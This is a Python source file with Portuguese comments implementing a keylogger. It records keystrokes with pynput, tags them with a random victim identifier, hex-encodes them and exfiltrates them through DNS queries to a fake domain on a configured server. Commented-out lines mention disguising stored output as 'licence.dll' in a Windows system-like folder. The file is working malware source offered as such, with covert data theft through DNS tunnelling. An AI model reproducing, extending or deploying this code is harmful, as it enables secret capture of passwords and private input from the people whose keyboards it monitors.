###############################################################
# Imports
###############################################################
import socket
import random
from pynput import keyboard
from dnslib import DNSRecord

###############################################################
# Vars. Global
###############################################################
# Ofuscação no Windows (Antigamente era salvo em arquivo... mudei os planos) 
# _PATH = f'C:\\Users\\{os.getlogin()}\\AppData\\Local\\Microsoft\\Windows NA'
# _NAME = 'licence.dll'

# Futuramente podemos passar essas VARs global
# Para dentro do code, está aqui apenas para
# facilitar as alterações
_DNS_ADDR = ('127.0.0.1', 9953)
_FAKE_DOMAIN = '.example.com'
_KEYS = []
_USR_HAS = None

###############################################################
# Classes e Funções
###############################################################
def hash_adler32(data):
    a = 1
    size = len(data)
    b = size % 35

    for ch in data:
        a = a + ord(ch) % 35
        b = b + size * ord(ch) % 35

    return hex(b * 35 + a)[2:]

def send_data(data):
    '''
    Recebe os dados e os envia usando requisições DNS
    de 63 em 63 bytes.

    Parameters:
        data (str): Data que iremos enviar
    
    Returns:
        None    
    '''
    global _DNS_ADDR, _FAKE_DOMAIN

    # Remove entradas None da lista - Unico metodo ate agora que funcionou para nao crashar
    # data = [entry for entry in data if entry is not None]

    # Divide os dados em partes menores para serem válidos
    # como nomes de domínio máximo de 63bytes por hostname.
    # Decidi apenas previnir caso a função seja chamada com mais chars do que deveria
    parts = [data[chunk:chunk+63] for chunk in range(0, len(data), 63)] 

    while len(parts) > 0:
        # Cria o payload com o nome de domínio fictício
        payload = parts.pop(0)
        payload = ''.join([hex(ord(c)) for c in payload]) # ord() no c
        payload = payload.replace('0x', '')
        request = str(payload) + str(_FAKE_DOMAIN)
        
        # Cria a requisição DNS
        domain = DNSRecord.question(request)

        # Envia a requisição DNS para o servidor
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(5.0)

        try:
            sock.sendto(domain.pack(), _DNS_ADDR)
        except:
            print('Erro ao enviar!')

        try:
            # Recebendo resposta falsa do DNS
            _ = sock.recvfrom(512)
        except socket.timeout:
            print('Tempo de espera expirado. Não foi recebida uma resposta do servidor DNS.')
            pass


def on_release(key):
    global _KEYS, _USR_HAS

    # Verifico se já está no tamanho de mandar o pacote DNS
    if len(_KEYS) >= (31 - len(_USR_HAS)):
        for ch in _USR_HAS:
            _KEYS.insert(0, ch)
        send_data(_KEYS)
        _KEYS = []

    # Condição de parada (podemos remover depois...)
    if key == keyboard.Key.esc:
        return False
    
    # Trato teclas / numeros
    try:
        if key.char != None:
            _KEYS.append(key.char) # ord()
            print(key.char)

        else:
            if '<96>' == str(key):
                _KEYS.append('0')
            elif '<97>' == str(key):
                _KEYS.append('1')
            elif '<98>' == str(key):
                _KEYS.append('2')
            elif '<99>' == str(key):
                _KEYS.append('3')
            elif '<100>' == str(key):
                _KEYS.append('4')
            elif '<101>' == str(key):
                _KEYS.append('5')
            elif '<102>' == str(key):
                _KEYS.append('6')
            elif '<103>' == str(key):
                _KEYS.append('7')
            elif '<104>' == str(key):
                _KEYS.append('8')
            elif '<105>' == str(key):
                _KEYS.append('9')
                
            # todo o resto que não tratei
            else:
                print(f'Não consegui identificar: {key}')

    # Trato se for algum caractere especial
    except AttributeError:
        print(f'Não tenho tratamento para isso: {key}')

###############################################################
# Main
###############################################################
if __name__ == "__main__":
    # Gerando nome aleatório
    _USR_HAS = [char for char in hash_adler32(str(random.randint(100, 999)))]

    # Iniciando Keylogger
    lst = keyboard.Listener(on_release=on_release)
    lst.start()
    lst.join()
